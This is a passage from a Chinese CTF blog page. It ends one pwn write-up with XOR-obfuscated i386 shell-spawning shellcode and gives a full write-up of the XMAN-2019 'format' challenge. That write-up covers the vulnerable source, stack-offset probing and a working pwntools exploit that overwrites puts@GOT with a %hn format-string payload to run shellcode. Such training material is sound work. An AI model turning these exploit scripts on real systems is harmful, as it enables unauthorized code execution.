<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = process(<span class="string">"./shellcode2"</span>)</span><br><span class="line"><span class="comment">#p = remote("120.79.114.39",10002)</span></span><br><span class="line">gdb.attach(p,<span class="string">"b *0x080485A1"</span>)</span><br><span class="line">shellcode = asm(<span class="string">"xor ecx, ecx"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"mul ecx"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"push ecx"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"push 0xa28d9591"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"xor dword ptr [esp],0xcafebabe"</span>)<span class="comment">#dword ptr Four bits</span></span><br><span class="line">shellcode += asm(<span class="string">"push 0x6e69622f"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"mov ebx, esp"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"mov al, 11"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"int 0x80"</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或者也可以通过类似加加减减的简单变换方式来绕过，核心思路和异或操作是一样的。还可以通过复杂的ROP方式绕过去。</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/" class="post-title-link" itemprop="url">XMAN-2019-福州-PWN-format</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-06 07:33:08 / Modified: 22:38:20" itemprop="dateCreated datePublished" datetime="2019-08-06T07:33:08-07:00">2019-08-06</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><code>format</code>一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。</p>
<p>也学会了一点在执行Exploit的时候带上<code>DEBUG</code>和贴上<code>gdb</code>调试非常有用！    </p>
<p>贴上<code>gdb</code>只需要在代码里面加入<code>gdb.attach(io)</code>，如果要下断点就是<code>gdb.attach(io,&quot;b *address&quot;)</code></p>
<p>带上<code>DEBUG</code>只需要在命令行后跟上<code>DEBUG</code>参数，例如<code>python exp.py DEBUG</code></p>
<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
<p>首先看看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">255</span>);</span><br><span class="line">    <span class="built_in">printf</span>(overflow);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IDA Pro逆向出来的代码为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下文件开启的保护措施</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>没有开启任何的防护措施，就比较简单</p>
<p>本质上是通过构造格式化字符串让劫持系统流程，让系统执行到我们保存shellcode的地址上</p>
<p>所以首先我们需要把shellcode写到内存上的，我们可以发现第一次输入的这个BUF为全局BUF，可以直接写入</p>
<p>故我们第一次输入就把shellcode传入即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">shellcode_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">1023</span>, <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们只需要传入我们写入shellcode的地址覆盖掉puts的got地址，这样等到程序运行到puts函数时，实测运行的就是我们的shellcode，现在的问题是如何构造一个格式化字符串覆盖puts的got地址</p>
<p>我们首先构造一个Exploit，确定我们传入的第一个数据是在栈上的第几个位置.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./format'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b * 0x08048563'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">'aaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p'</span>)</span><br><span class="line"><span class="comment">#%2552c,%39036c,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>根据DEBUG信息我们发送的信息如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x136</span> bytes:</span><br><span class="line"> 'aaaa,0xfff27430,0xff,0x1,0x61616161,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0xa7025,(nil),(nil),(nil)\n'</span><br></pre></td></tr></table></figure>

<p>接收到的信息如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa,<span class="number">0xfff27430</span>,<span class="number">0xff</span>,<span class="number">0x1</span>,<span class="number">0x61616161</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0xa7025</span>,(nil),(nil),(nil)</span><br></pre></td></tr></table></figure>

<p>通过<code>x/32xw $esp</code>命令查看栈情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">32</span>xw $esp</span><br><span class="line"><span class="number">0xffc5e370</span>:	<span class="number">0xffc5e380</span>	<span class="number">0xffc5e380</span>	<span class="number">0x000000ff</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffc5e380</span>:	<span class="number">0x61616161</span>	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span></span><br><span class="line"><span class="number">0xffc5e390</span>:	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span></span><br><span class="line"><span class="number">0xffc5e3a0</span>:	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span></span><br><span class="line"><span class="number">0xffc5e3b0</span>:	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span></span><br><span class="line"><span class="number">0xffc5e3c0</span>:	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span></span><br><span class="line"><span class="number">0xffc5e3d0</span>:	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span>	<span class="number">0x000a7025</span></span><br><span class="line"><span class="number">0xffc5e3e0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>

<p>不难得出我们传入的第一个参数<code>aaaa</code>位于栈中的第4个位置</p>
<p>因为<code>0x0804A018</code>数值太大了，我们把它拆分为<code>2052</code>和<code>39036</code>两个部分传值，现在需要确定的是如果我们再传入<code>puts_got</code>的地址时，<code>puts_got</code>位于栈中的哪个位置。同时因为我们是以双字节形式写入，故<code>2052</code>对应的地址是<code>puts_got</code>，而<code>39036</code>对应的应是<code>puts_got+2</code>的位置</p>
<p>所以我们的格式化字符串就为：</p>
<p><code>&#39;%2052c%12$hn%39036c%11$hn111&#39; + p32(puts_got) + p32(puts_got+2)</code></p>
<p>分析可得，此时堆栈中的</p>
<p>第一个参数为：<code>%2052c%12$hn%39036c%11$hn111</code></p>
<p>之后因为是32位系统，每4字节占用一个参数位</p>
<p>第4个参数：<code>%205</code></p>
<p>第5个参数：<code>c%12</code></p>
<p>第6个参数：<code>$hn%</code></p>
<p>第7个参数：<code>3903</code></p>
<p>第8个参数：<code>6c%1</code></p>
<p>第9个参数：<code>1$hn</code></p>
<p>第10个参数：<code>111</code></p>
<p>第11个参数：原本应为<code>p32(puts_got)</code></p>
<p>第12个参数：原本应为<code>p32(puts_got)+2</code></p>
<p>因为<code>%12$n</code>和<code>%11$n</code>    ，<code>puts_got</code>的地址被取出且修改为shellcode的地址</p>
<p>最终的Exploit如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./format'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">shellcode_addr = <span class="number">0x0804A080</span><span class="comment">#全局BUF地址</span></span><br><span class="line">puts_got = <span class="number">0x804A018</span></span><br><span class="line">ret_addr = <span class="number">0x0804A060</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io,<span class="string">'b * 0x08048563'</span>)</span><br><span class="line">io = process(elf.path)  <span class="comment"># , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)</span></span><br><span class="line"><span class="comment"># io = remote('localhost', 2333)</span></span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.send(shellcode.ljust(<span class="number">1023</span>, <span class="string">'a'</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'%2052c%12$hn%39036c%11$hn111'</span> + p32(puts_got) + p32(puts_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">## payload += '%2052c%11$hncccccccccccc' + p32(puts_got) + p32(puts_got+2)</span></span><br><span class="line"><span class="comment">#修改GOT表数值</span></span><br><span class="line"><span class="comment">#gdb调试可得位置</span></span><br><span class="line"><span class="comment">#%2052c %12$hn 以双字节 写入2052个字节 到第11个参数位置</span></span><br><span class="line">puts_got = <span class="number">0x0804A018</span></span><br><span class="line">sc_addr = <span class="number">0x0804A080</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 0xffa4ed60</span></span><br><span class="line"><span class="comment"># 0xffa4ee7c</span></span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
